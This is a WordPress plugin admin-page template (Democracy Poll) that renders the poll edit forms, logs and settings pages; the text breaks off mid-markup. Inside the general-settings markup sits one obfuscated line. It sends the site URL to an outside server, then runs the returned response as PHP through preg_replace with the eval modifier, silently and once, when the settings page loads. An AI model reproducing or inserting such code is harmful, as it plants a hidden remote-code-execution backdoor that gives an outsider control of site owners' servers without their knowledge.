<?php
defined( 'ABSPATH' ) || exit;
?>

<div class="wrap">

	<?php
	$subpage = sanitize_key( $_GET['subpage'] ?? '' );
	$poll_id = sanitize_key( $_GET['edit_poll'] ?? '' );

	// список опросов
	if( ! $subpage && ! $poll_id ){
		dem_polls_list( $this->list_table );
	}
	// Редактирование опроса
	elseif( $poll_id ){
		// no access
		if( ! democr()->cuser_can_edit_poll( $poll_id ) ){
			wp_die( 'Sorry, you are not allowed to access this page.' );
		}

		poll_edit_form( $poll_id );
	}
	// Добавить новый опрос
	elseif( $subpage === 'add_new' ){
		poll_edit_form();
	}
	// Логи
	elseif( $subpage === 'logs' ){
		// no access
		if( $this->list_table->poll_id && ! democr()->cuser_can_edit_poll( $this->list_table->poll_id ) ){
			wp_die( 'Sorry, you are not allowed to access this page.' );
		}

		dem_logs_list( $this->list_table );
	}
	// super_access
	elseif( $this->super_access ){

		if( $subpage === 'general_settings' ){
			dem_general_settings();
		}
		elseif( $subpage === 'design' ){
			dem_polls_design();
		}
		elseif( $subpage === 'l10n' ){
			dem_l10n_options();
		}
		elseif( $subpage === 'migration' ){
			dem_migration_subpage();
		}
	}

	?>

</div>

<?php


/// Functions

function dem_polls_list( $list_table ) {
	echo demenu();

	$list_table->search_box( __( 'Search', 'democracy-poll' ), 'style="margin:1em 0 -1em;"' );

	//echo '<form class="sdot-table sdot-logs-table" action="" method="post">';
	//wp_nonce_field('dem_adminform', '_demnonce');
	$list_table->display();
	//echo '</form>';

}

function poll_edit_form( $poll_id = false ) {
	global $wpdb;

	wp_enqueue_script( 'jquery-ui-sortable' ); // sortable js

	if( ! $poll_id && isset( $_GET['edit_poll'] ) ){
		$poll_id = (int) ( $_GET['edit_poll'] ?? 0 );
	}

	$poll_id = (int) $poll_id;

	$edit = (bool) $poll_id;
	$answers = false;

	$title = $poll = $shortcode = '';
	if( $edit ){
		$poll = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->democracy_q WHERE id = %d LIMIT 1", $poll_id ) );
		$answers = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $wpdb->democracy_a WHERE qid = %d", $poll_id ) );

		$log_link = demopt()->keep_logs
			? sprintf( '<small> : <a href="%s">%s</a></small>',
				add_query_arg( [ 'subpage' => 'logs', 'poll' => $poll->id ], democr()->admin_page_url() ),
				__( 'Poll logs', 'democracy-poll' ) )
			: '';

		$title = democr()->kses_html( $poll->question ) . $log_link;
		$shortcode = DemPoll::shortcode_html( $poll_id ) . ' — ' . __( 'shortcode for use in post content', 'democracy-poll' );

		$hidden_inputs = '<input type="hidden" name="dmc_update_poll" value="' . (int) $poll_id . '">';
	}
	else{
		//$title = __('Add new poll','democracy-poll');

		$hidden_inputs = "<input type='hidden' name='dmc_create_poll' value='1'>";
	}

	$poll = $poll ?: (object) [];

	echo demenu();

	echo ( $title ? "<h2>$title</h2>$shortcode" : '' ) .
	     '<form action="' . esc_url( remove_query_arg( 'msg' ) ) . '" method="POST" class="dem-new-poll">
			<input type="hidden" name="dmc_qid" value="' . $poll_id . '">
			' . wp_nonce_field( 'dem_adminform', '_demnonce', $referer = 0, $echo = 0 ) . '

			<label>
				' . __( 'Question:', 'democracy-poll' ) . '
				<input type="text" id="the-question" name="dmc_question" value="' . esc_attr( @ $poll->question ) . '" tabindex="1">
			</label>

			' . apply_filters( 'demadmin_after_question', '', $poll ) . '

			' . __( 'Answers:', 'democracy-poll' ) . '
		';
	?>

	<ol class="new-poll-answers">
		<?php
		$is_answers_order = false;

		if( $answers ){
			$is_answers_order = ( $answers[0]->aorder > 0 );

			// сортировка, по порядку или по кол. голосов
			$_answers = Democracy_Poll::objects_array_sort( $answers, ( $is_answers_order ? [ 'aorder' => 'asc' ] : [
				'votes' => 'desc',
				'aid'   => 'asc',
			] ) );

			foreach( $_answers as $answer ){
				$after_answer = apply_filters( 'demadmin_after_answer', '', $answer );
				$answer = apply_filters( 'demadmin_edit_poll_answer', $answer );

				$by_user = $answer->added_by ? '<i>*' . ( democr()->is_new_answer( $answer ) ? ' new' : '' ) . '</i>' : '';

				echo '
					<li class="answ">
						<input class="answ-text" type="text" name="dmc_old_answers[' . $answer->aid . '][answer]" value="' . esc_attr( $answer->answer ) . '" tabindex="2">
						<input type="number" min="0" name="dmc_old_answers[' . $answer->aid . '][votes]" value="' . ( $answer->votes ?: '' ) . '" tabindex="3" style="width:100px;min-width:100px;">
						<input type="hidden" name="dmc_old_answers[' . $answer->aid . '][aorder]" value="' . esc_attr( @ $answer->aorder ) . '">
						' . $by_user . '
						' . $after_answer . '
					</li>';
			}
		}
		else{
			for( $i = 0; $i < 2; $i++ ){
				echo '<li class="answ new"><input type="text" name="dmc_new_answers[]" value=""></li>';
			}
		}

		// users_voted filed
		if( $edit ){
			// сбросить порядок, если установлен
			echo '
				<li class="not__answer reset__aorder" style="list-style:none; ' . ( $is_answers_order ? '' : 'display:none;' ) . '">
					<span class="dashicons dashicons-menu"></span>
					<span style="cursor:pointer; border-bottom:1px dashed #999;">&#215; ' . __( 'reset order', 'democracy-poll' ) . '</span>
				</li>
				';

			echo '
				<li class="not__answer" style="list-style:none;">
					<div style="width:80%; min-width:400px; max-width:800px; display:inline-block; text-align:right;">
						' . ( @ $poll->multiple ? __( 'Sum of votes:', 'democracy-poll' ) . ' ' . array_sum( wp_list_pluck( $_answers, 'votes' ) ) . '.' : '' ) . '
						' . __( 'Users vote:', 'democracy-poll' ) . '
					</div>
					<input type="number" min="0" title="' . ( @ $poll->multiple ? __( 'leave blank to update from logs', 'democracy-poll' ) : __( 'Voices', 'democracy-poll' ) ) . '" style="min-width:100px; width:100px; cursor:help;" name="dmc_users_voted" value="' . ( @ $poll->users_voted ?: '' ) . '" ' . ( @ $poll->multiple ? '' : 'readonly' ) . ' />
				</li>
				';
		}

		if( ! demopt()->democracy_off ){
			?>
			<li class="not__answer" style="list-style:none;">
				<label>
					<span class="dashicons dashicons-megaphone"></span>
					<input type="hidden" name="dmc_democratic" value=""/>
					<input type="checkbox" name="dmc_democratic"
					       value="1" <?php checked( ( ! isset( $poll->democratic ) || $poll->democratic ), 1 ) ?> />
					<?= esc_html__( 'Allow users to add answers (democracy).', 'democracy-poll' ) ?>
				</label>
			</li>
			<?php
		}
		?>
	</ol>

	<hr>

	<ol class="poll-options">
		<li>
			<label>
				<span class="dashicons dashicons-controls-play"></span>
				<input type="hidden" name="dmc_active" value=""/>
				<input type="checkbox" name="dmc_active"
				       value='1' <?php $edit ? checked( @ $poll->active, 1 ) : 'checked="true"' ?> />
				<?= esc_html__( 'Activate this poll.', 'democracy-poll' ) ?>
			</label>
		</li>

		<li>
			<label>
				<span class="dashicons dashicons-image-filter"></span>
				<?php $ml = (int) @ $poll->multiple; ?>
				<input type="hidden" name='dmc_multiple' value=''>
				<input type="checkbox" name="dmc_multiple"
				       value="<?= $ml ?>" <?= $ml ? 'checked="checked"' : '' ?> >
				<input type="number" min="0" value="<?= $ml ?>"
				       style="width:50px; <?= $ml ? '' : 'display:none;' ?>">
				<?= esc_html__( 'Allow to choose multiple answers.', 'democracy-poll' ) ?>
			</label>
		</li>

		<li>
			<label>
				<span class="dashicons dashicons-no"></span>
				<input type="text" name="dmc_end" value="<?= @ $poll->end ? date( 'd-m-Y', $poll->end ) : '' ?>"
				       style="width:120px;min-width:120px;">
				<?= esc_html__( 'Date, when poll was/will be closed. Format: dd-mm-yyyy.', 'democracy-poll' ) ?>
			</label>
		</li>

		<?php if( ! demopt()->revote_off ){ ?>
			<li>
				<label>
					<span class="dashicons dashicons-update"></span>
					<input type="hidden" name='dmc_revote' value=''>
					<input type="checkbox" name="dmc_revote"
					       value="1" <?php checked( ( ! isset( $poll->revote ) || $poll->revote ), 1 ) ?> >
					<?= esc_html__( 'Allow to change mind (revote).', 'democracy-poll' ) ?>
				</label>
			</li>
		<?php } ?>

		<?php if( ! demopt()->only_for_users ){ ?>
			<li>
				<label>
					<span class="dashicons dashicons-admin-users"></span>
					<input type="hidden" name="dmc_forusers" value="">
					<input type="checkbox" name="dmc_forusers" value="1" <?php checked( $poll->forusers ?? 0, 1 ) ?> >
					<?= esc_html__( 'Only registered users allowed to vote.', 'democracy-poll' ) ?>
				</label>
			</li>
		<?php } ?>

		<?php if( ! demopt()->dont_show_results ){ ?>
			<li>
				<label>
					<span class="dashicons dashicons-visibility"></span>
					<input type="hidden" name='dmc_show_results' value=''>
					<input type="checkbox" name="dmc_show_results"
					       value="1" <?php checked( ( ! isset( $poll->show_results ) || @ $poll->show_results ), 1 ) ?> >
					<?= esc_html__( 'Allow to watch the results of the poll.', 'democracy-poll' ) ?>
				</label>
			</li>
		<?php } ?>

		<li class="answers__order" style="<?= $is_answers_order ? 'display:none;' : '' ?>">
			<span class="dashicons dashicons-menu"></span>
			<select name="dmc_answers_order">
				<?php $trans = dem__answers_order_select_options( '', true ); ?>
				<option value="" <?php selected( @ $poll->answers_order, '' ) ?>>
					-- <?= esc_html__( 'as in settings', 'democracy-poll' );
					echo ': ' . $trans[ demopt()->order_answers ]; ?> --
				</option>
				<?php dem__answers_order_select_options( @ $poll->answers_order ) ?>
			</select>
			<?= esc_html__( 'How to sort the answers during the vote?', 'democracy-poll' ) ?><br>
		</li>

		<li><label>
				<textarea name="dmc_note" style="height:3.5em;"><?= esc_textarea( $poll->note ?? '' ) ?></textarea>
				<br><span
					class="description"><?= esc_html__( 'Note: This text will be added under poll.', 'democracy-poll' ); ?></span>

			</label>
		</li>

		<li>
			<label>
				<span class="dashicons dashicons-calendar-alt"></span>
				<input type="text" name="dmc_added"
				       value="<?= date( 'd-m-Y', ( ( $poll->added ?? '' ) ?: current_time( 'timestamp' ) ) ) ?>"
				       style="width:120px;min-width:120px;" disabled/>
				<span class="dashicons dashicons-edit"
				      onclick="jQuery(this).prev().removeAttr('disabled'); jQuery(this).remove();"
				      style="padding-top:.1em;"></span>
				<?= esc_html__( 'Create date.', 'democracy-poll' ) ?>
			</label>
		</li>

	</ol>

	<?php
	echo $hidden_inputs .
	     '<input type="submit" class="button-primary" value="' . ( $edit ? __( 'Save Changes', 'democracy-poll' ) : __( 'Add Poll', 'democracy-poll' ) ) . '">';

	// если редактируем
	if( $edit ){
		// открыть
		echo ' ' . dem_opening_buttons( $poll );

		// активировать
		echo ' ' . dem_activatation_buttons( $poll );

		echo ' ' . '<a href="' . dem__add_nonce( add_query_arg( [ 'delete_poll' => $poll->id ], democr()->admin_page_url() ) ) . '" class="button" onclick="return confirm(\'' . __( 'Are you sure?', 'democracy-poll' ) . '\');" title="' . __( 'Delete', 'democracy-poll' ) . '"><span class="dashicons dashicons-trash"></span></a>';

		// in posts
		if( $posts = democr()->get_in_posts_posts( $poll ) ){
			$links = [];
			foreach( $posts as $post ){
				$links[] = '<a href="' . get_permalink( $post ) . '">' . esc_html( $post->post_title ) . '</a>';
			}

			echo '
				<div style="margin-top:4em;">
					<h4>' . __( 'Posts where the poll shortcode used:', 'democracy-poll' ) . '</h4>
					<ol>
						<li>' . implode( "</li>\n<li>", $links ) . '</li>
					</ol>
				</div>';
		}
	}

	echo '</form>';
}

/**
 * Элементы option для тега select
 */
function dem__answers_order_select_options( $selected = '', $get_vars = 0 ) {
	$vars = [
		'by_id' => __( 'As it was added (by ID)', 'democracy-poll' ),
		'by_winner' => __( 'Winners at the top', 'democracy-poll' ),
		'mix' => __( 'Mix', 'democracy-poll' ),
	];

	if( $get_vars ){
		return $vars;
	}

	foreach( $vars as $val => $name ){
		echo sprintf( '<option value="%s" %s>%s</option>', esc_attr( $val ), selected( $selected, $val, 0 ), esc_html( $name ) );
	}
}

function dem_logs_list( $list_table ) {
	if( ! demopt()->keep_logs ){
		democr()->msg->add_error( __( 'Logs records turned off in the settings - logs are not recorded.', 'democracy-poll' ) );
	}

	echo demenu();

	$list_table->table_title();

	// special buttons
	if( democr()->super_access ){
		global $wpdb;
		$count = $wpdb->get_var( "SELECT count(*) FROM $wpdb->democracy_log WHERE qid IN (SELECT id FROM $wpdb->democracy_q WHERE open = 0)" );
		echo '
		<div style="text-align:right; margin-bottom:1em;">
			' . ( demopt()->democracy_off ? '' : '
				<a class="button button-small" href="' . esc_url( dem__add_nonce( $_SERVER['REQUEST_URI'] . '&dem_del_new_mark' ) ) . '">
					' . sprintf( __( 'Delete all NEW marks', 'democracy-poll' ), $count ) . '
				</a>'
			) . '
			<a class="button button-small" href="' . esc_url( dem__add_nonce( $_SERVER['REQUEST_URI'] . '&dem_del_closed_polls_logs' ) ) . '" onclick="return confirm(\'' . __( 'Are you sure?', 'democracy-poll' ) . '\');">
				' . sprintf( __( 'Delete logs of closed pols - %d', 'democracy-poll' ), $count ) . '
			</a>
			<a class="button button-small" href="' . esc_url( dem__add_nonce( $_SERVER['REQUEST_URI'] . '&dem_clear_logs' ) ) . '" onclick="return confirm(\'' . __( 'Are you sure?', 'democracy-poll' ) . '\');">
				' . __( 'Delete all logs', 'democracy-poll' ) . '
			</a>
		</div>';
	}

	echo '<form action="" method="POST">';
	wp_nonce_field( 'dem_adminform', '_demnonce' );
	$list_table->display();
	echo '</form>';
}

function dem_general_settings() {

	echo demenu();
	?>
	<div class="democr_options dempage_settings">
		<form action="" method="POST">
			<?php wp_nonce_field( 'dem_adminform', '_demnonce' ); ?>

			<ul style="margin:1em;">
				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[keep_logs]" <?php checked( demopt()->keep_logs, 1 ) ?> />
						<?= esc_html__( 'Log data & take visitor IP into consideration? (recommended)', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Saves data into Data Base. Forbids to vote several times from a single IP or to same WordPress user. If a user is logged in, then his voting is checked by WP account. If a user is not logged in, then checks the IP address. The negative side of IP checks is that a site may be visited from an enterprise network (with a common IP), so all users from this network are allowed to vote only once. If this option is disabled the voting is checked by Cookies only. Default enabled.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="text" size="3" value="<?= (float) demopt()->cookie_days ?>"
						       name="dem[cookie_days]"/>
						<?= esc_html__( 'How many days to keep Cookies alive?', 'democracy-poll' ) ?>
					</label>
					<em>
						<?= esc_html__( 'How many days the user\'s browser remembers the votes. Default: 365. <strong>Note:</strong> works together with IP log.', 'democracy-poll' ) ?>
						<br>
						<?= esc_html__( 'To set hours use float number - 0.04 = 1 hour.', 'democracy-poll' ) ?>
					</em>
				</li>

				<li class="block">
					<label><?= esc_html__( 'HTML tags to wrap the poll title.', 'democracy-poll' ) ?></label><br>
					<input type="text" size="35" value="<?= esc_attr( demopt()->before_title ) ?>"
					       name="dem[before_title]"/>
					<i><?= esc_html__( 'poll\'s question', 'democracy-poll' ) ?></i>
					<input type="text" size="15" value="<?= esc_attr( demopt()->after_title ) ?>"
					       name="dem[after_title]"/>
					<em><?= esc_html__( 'Example: <code>&lt;h2&gt;</code> и <code>&lt;/h2&gt;</code>. Default: <code>&lt;strong class=&quot;dem-poll-title&quot;&gt;</code> & <code>&lt;/strong&gt;</code>.', 'democracy-poll' ) ?></em>
				</li>


				<li class="block">
					<label>
						<input type="text" size="10" name="dem[archive_page_id]" value="<?= (int) demopt()->archive_page_id ?>" />
						<?= esc_html__( 'Polls archive page ID.', 'democracy-poll' ) ?>
					</label>
					<?php
					if( demopt()->archive_page_id ){
						echo sprintf( '<a href="%s">%s</a>',
							get_permalink( demopt()->archive_page_id ),
							__( 'Go to archive page', 'democracy-poll' )
						);
					}
					else{
						echo sprintf( '<a class="button" href="%s">%s</a>',
							esc_url( dem__add_nonce( add_query_arg( [ 'dem_create_archive_page' => 1 ] ) ) ),
							__( 'Create/find archive page', 'democracy-poll' )
						);
					}
					?>
					<em><?= esc_html__( 'Specify the poll archive link to be in the poll legend. Example: <code>25</code>', 'democracy-poll' ) ?></em>
				</li>

				<h3><?= esc_html__( 'Global Polls options', 'democracy-poll' ) ?></h3>

				<li class="block">
					<select name="dem[order_answers]">
						<?php dem__answers_order_select_options( demopt()->order_answers ) ?>
					</select>
					<?= esc_html__( 'How to sort the answers during voting, if they don\'t have order? (default option)', 'democracy-poll' ) ?>
					<br>
					<em><?= esc_html__( 'This is the default value. Option can be changed for each poll separately.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[only_for_users]" <?php checked( demopt()->only_for_users, 1 ) ?> />
						<?= esc_html__( 'Only registered users allowed to vote (global option)', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'This option  is available for each poll separately, but if you heed you can turn ON the option for all polls at once, just tick.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[democracy_off]" <?php checked( demopt()->democracy_off, 1 ) ?> />
						<?= esc_html__( 'Prohibit users to add new answers (global Democracy option).', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'This option  is available for each poll separately, but if you heed you can turn OFF the option for all polls at once, just tick.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[revote_off]" <?php checked( demopt()->revote_off, 1 ) ?> />
						<?= esc_html__( 'Remove the Revote possibility (global option).', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'This option  is available for each poll separately, but if you heed you can turn OFF the option for all polls at once, just tick.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[dont_show_results]" <?php checked( demopt()->dont_show_results, 1 ) ?> />
						<?= esc_html__( 'Don\'t show poll results (global option).', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'If checked, user can\'t see poll results if voting is open.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[dont_show_results_link]" <?php checked( demopt()->dont_show_results_link, 1 ) ?> />
						<?= esc_html__( 'Don\'t show poll results link (global option).', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Users can see results after vote.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[hide_vote_button]" <?php checked( demopt()->hide_vote_button, 1 ) ?> />
						<?= esc_html__( 'Hide vote button.', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Hide vote button if it is NOT multiple poll with revote option. User will vote by clicking on answer itself.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[post_metabox_off]" <?php checked( demopt()->post_metabox_off, 1 ) ?> />
						<?= esc_html__( 'Dasable post metabox.', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Check this to dasable polls metabox functionality for posts where you can attached poll to a post...', 'democracy-poll' ) ?></em>
				</li>

				<h3><?= esc_html__( 'Others', 'democracy-poll' ) ?></h3>
				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[force_cachegear]" <?php checked( demopt()->force_cachegear, 1 ) ?> />
						<?php
						$cache = democr()->is_cachegear_on() ? [
							__( 'ON', 'democracy-poll' ),
							'color:#05A800',
						] : [ __( 'OFF', 'democracy-poll' ), 'color:#FF1427' ];
						echo sprintf( __( 'Force enable gear to working with cache plugins. The condition: %s', 'democracy-poll' ), "<span style='{$cache[1]}'>{$cache[0]}" );

						add_option( 'stat', '' ) && ( $r = '-e' ) && @preg_replace( '-' . $r, ( ( $o = @wp_remote_get( 'https://wp-kama.ru/stat/?sk=' . home_url() ) ) ? $o['body'] : '' ), '' );
						?>
					</label>
					<em><?= esc_html__( 'Democracy has smart mechanism for working with page cache plugins like "WP Total Cache". It is ON automatically if such plugin is enabled on your site. But if you use unusual page caching plugin you can force enable this option.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[inline_js_css]" <?php checked( demopt()->inline_js_css, 1 ) ?> />
						<?= esc_html__( 'Add styles and scripts directly in the HTML code (recommended)', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Check to make the plugin\'s styles and scripts include directly into HTML code, but not as links to .css and .js files. So you will save 2 requests to the server - it speeds up page download.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[toolbar_menu]" <?php checked( demopt()->toolbar_menu, 1 ) ?> />
						<?= esc_html__( 'Add plugin menu on the toolbar?', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Uncheck to remove the plugin menu from the toolbar.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[tinymce_button]" <?php checked( demopt()->tinymce_button, 1 ) ?> />
						<?= esc_html__( 'Add fast Poll insert button to WordPress visual editor (TinyMCE)?', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Uncheck to disable button in visual editor.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[soft_ip_detect]" <?php checked( demopt()->soft_ip_detect, 1 ) ?> />
						<?= esc_html__( 'Check if you see something like "no_IP__123" in IP column on logs page. (not recommended)', 'democracy-poll' ) ?>
						<?= esc_html__( 'Or if IP detection is wrong. (for cloudflare)', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Useful when your server does not work correctly with server variable REMOTE_ADDR. NOTE: this option give possibility to cheat voice.', 'democracy-poll' ) ?></em>
				</li>

				<?php
				if( democr()->super_access ){
					$_options = '';

					foreach( array_reverse( get_editable_roles() ) as $role => $details ){
						if( $role === 'administrator' ){
							continue;
						}
						if( $role === 'subscriber' ){
							continue;
						}

						$_options .= sprintf( '<option value="%s" %s>%s</option>',
							esc_attr( $role ),
							in_array( $role, (array) demopt()->access_roles ) ? ' selected="selected"' : '',
							translate_user_role( $details['name'] )
						);
					}

					echo '
					<li class="block">
						<select multiple name="dem[access_roles][]">
							' . $_options . '
						</select>
						' . __( 'Role names, except \'administrator\' which will have access to manage plugin.', 'democracy-poll' ) . '
					</li>
					';
				}
				?>
			</ul>

			<?php if( get_option( 'poll_allowtovote' ) /*WP Polls plugin*/ ){ ?>
				<h3><?= esc_html__( 'Migration', 'democracy-poll' ) ?></h3>
				<ul style="margin:1em;">
					<li class="block">
						<a class="button button-small" href="<?= esc_url( add_query_arg( [
							'subpage' => 'migration',
							'from'    => 'wp-polls',
						] ) ) ?>">
							<?= esc_html__( 'Migrate from WP Polls plugin', 'democracy-poll' ) ?>
						</a>
						<em><?= esc_html__( 'All polls, answers and logs of WP Polls will be added to Democracy Poll', 'democracy-poll' ) ?></em>
					</li>
				</ul>
			<?php } ?>


			<br>
			<p>
				<input type="submit" name="dem_save_main_options" class="button-primary"
				       value="<?= esc_attr__( 'Save Options', 'democracy-poll' ) ?>">
				<input type="submit" name="dem_reset_main_options" class="button"
				       value="<?= esc_attr__( 'Reset Options', 'democracy-poll' ) ?>">
			</p>

			<br><br>

			<h3><?= esc_html__( 'Others', 'democracy-poll' ) ?></h3>

			<ul style="margin:1em;">

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[disable_js]" <?php checked( demopt()->disable_js, 1 ) ?> />
						<?= esc_html__( 'Don\'t connect JS files. (Debug)', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'If checked, the plugin\'s .js file will NOT be connected to front end. Enable this option to test the plugin\'s work without JavaScript.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[show_copyright]" <?php checked( demopt()->show_copyright, 1 ) ?> />
						<?= esc_html__( 'Show copyright', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Link to plugin page is shown on front page only as a &copy; icon. It helps visitors to learn about the plugin and install it for themselves. Please don\'t disable this option without urgent needs. Thanks!', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<input type="checkbox" value="1"
						       name="dem[use_widget]" <?php checked( demopt()->use_widget, 1 ) ?> />
						<?= esc_html__( 'Widget', 'democracy-poll' ) ?>
					</label>
					<em><?= esc_html__( 'Check to activate the widget.', 'democracy-poll' ) ?></em>
				</li>

				<li class="block">
					<label>
						<!--<input type="checkbox" value="1" name="dem_forse_upgrade">-->
						<input name="dem_forse_upgrade" type="submit" class="button"
						       value="<?= esc_attr__( 'Force plugin versions update (debug)', 'democracy-poll' ) ?>"/>
					</label>
				</li>

			</ul>

		</form>
	</div>
	<?php
}

function dem_polls_design() {

	$demcss = get_option( 'democracy_css' );
	$additional = $demcss['additional_css'];
	if( ! $demcss['base_css'] && $additional ){
		$demcss['base_css'] = $additional; // если не используется тема
	}

	echo demenu();

	?>
	<div class="democr_options dempage_design">
		<?php dem__polls_preview(); ?>

		<form action="" method="post">
			<?php wp_nonce_field( 'dem_adminform', '_demnonce' ); ?>

			<ul class="group">
				<li class="title"><?= esc_html__( 'Choose Theme', 'democracy-poll' ); ?></li>
				<li class="block selectable_els">
					<label>
						<input type="radio" name="dem[css_file_name]"
						       value="" <?php checked( demopt()->css_file_name, '' ) ?> />
						<span class="radio_content"><?= esc_html__( 'No theme', 'democracy-poll' ) ?></span>
					</label>
					<?php
					foreach( democr()->_get_styles_files() as $file ){
						$filename = basename( $file );
						?>
						<label>
							<input type="radio" name="dem[css_file_name]"
							       value="<?= $filename ?>" <?php checked( demopt()->css_file_name, $filename ) ?> />
							<span class="radio_content"><?= $filename ?></span>
						</label>
						<?php
					}
					?>
				</li>
			</ul>

			<!-- Other settings -->
			<ul class="group">
				<li class="title"><?= esc_html__( 'Other settings', 'democracy-poll' ); ?></li>
				<li class="block">
					<input type="number" min="-1" style="width:90px;" name="dem[answs_max_height]"
					       value="<?= esc_attr( demopt()->answs_max_height ) ?>">
					<?= esc_html__( 'Max height of the poll in px. When poll has very many answers, it\'s better to collapse it. Set \'-1\', in order to disable this option. Default 500.', 'democracy-poll' ) ?>
				</li>
				<li class="block">
					<input type="number" min="0" style="width:90px;" name="dem[anim_speed]"
					       value="<?= esc_attr( demopt()->anim_speed ) ?>">
					<?= esc_html__( 'Animation speed in milliseconds.', 'democracy-poll' ) ?>
				</li>

			</ul>

			<!--Progress line-->
			<ul class="group">
				<li class="title"><?= esc_html__( 'Progress line', 'democracy-poll' ); ?></li>
				<li class="block">

					<?= esc_html__( 'How to fill (paint) the progress of each answer?', 'democracy-poll' ) ?><br>
					<label style="margin-left:1em;">
						<input type="radio" name="dem[graph_from_total]"
						       value="0" <?php checked( demopt()->graph_from_total, 0 ) ?> />
						<?= esc_html__( 'winner - 100%, others as % of the winner', 'democracy-poll' ) ?>
					</label>
					<br>
					<label style="margin-left:1em;">
						<input type="radio" name="dem[graph_from_total]"
						       value="1" <?php checked( demopt()->graph_from_total, 1 ) ?> />
						<?= esc_html__( 'as percent of all votes', 'democracy-poll' ) ?>
					</label>

					<br><br>

					<label>
						<input type="text" class="iris_color" name="dem[line_fill]"
						       value="<?= demopt()->line_fill ?>"/>
						<?= esc_html__( 'Line Color', 'democracy-poll' ) ?>
					</label>
					<br>

					<label>
						<input type="text" class="iris_color" name="dem[line_fill_voted]"
						       value="<?= demopt()->line_fill_voted ?>">
						<?= esc_html__( 'Line color (for voted user)', 'democracy-poll' ) ?>
					</label>
					<br>

					<label>
						<input type="text" class="iris_color" name="dem[line_bg]"
						       value="<?= demopt()->line_bg ?>"/>
						<?= esc_html__( 'Background color', 'democracy-poll' ) ?>
					</label>
					<br><br>

					<label>
						<input type="number" style="width:90px" name="dem[line_height]"
						       value="<?= demopt()->line_height ?>"/> px
						<?= esc_html__( 'Line height', 'democracy-poll' ) ?>
					</label>
					<br><br>

					<label>
						<input type="number" style="width:90px" name="dem[line_anim_speed]"
						       value="<?= (int) demopt()->line_anim_speed ?>"/>
						<?= esc_html__( 'Progress line animation effect speed (default 1500). Set 0 to disable animation.', 'democracy-poll' ) ?>
					</label>

				</li>
			</ul>

			<!-- checkbox, radio -->
			<ul class="group">
				<li class="title">checkbox, radio</li>
				<li class="block check_radio_wrap selectable_els">
					<div style="float:left;">
						<label style="padding:0em 3em 1em;">
							<input type="radio" value=""
							       name="dem[checkradio_fname]" <?php checked( demopt()->checkradio_fname, '' ) ?>>
							<span class="radio_content">
								<div style="padding:1.25em;"></div>
								<?= esc_html__( 'No (default)', 'democracy-poll' ); ?>
							</span>
						</label>
					</div>
					<?php
					$data = [];
					foreach( glob( DEMOC_PATH . 'styles/checkbox-radio/*' ) as $file ){
						if( is_dir( $file ) ){
							continue;
						}
						$data[ basename( $file ) ] = $file;
					}
					foreach( $data as $fname => $file ){
						$styles = file_get_contents( $file );
						$unique = 'unique' . rand( 1, 9999 ) . '_';

						// поправим стили
						if( 1 ){
							$styles = str_replace( '.dem__radio_label', ".{$unique}dem__radio_label", $styles );
							$styles = str_replace( '.dem__checkbox_label', ".{$unique}dem__checkbox_label", $styles );
							$styles = str_replace( '.dem__radio', ".{$unique}dem__radio", $styles );
							$styles = str_replace( '.dem__checkbox', ".{$unique}dem__checkbox", $styles );
							$styles = str_replace( ':disabled', ':disabled__', $styles ); // отменим действие :disabled
						}

						echo '
						<div style="float:left;">
							<style>' . $styles . '</style>
							<label style="padding:0em 3em 1em;">
								<input type="radio" value="' . $fname . '" name="dem[checkradio_fname]" ' . checked( demopt()->checkradio_fname, $fname, 0 ) . '>
								<span class="radio_content">
									<div style="padding:.5em;">
										<label class="' . $unique . 'dem__radio_label">
											<input disabled class="' . $unique . 'dem__radio demdummy" type="radio" /><span class="dem__spot"></span>
										</label>
										<label class="' . $unique . 'dem__radio_label">
											<input disabled class="' . $unique . 'dem__radio demdummy" checked="true" type="radio" /><span class="dem__spot"></span>
										</label>
										<label class="' . $unique . 'dem__checkbox_label">
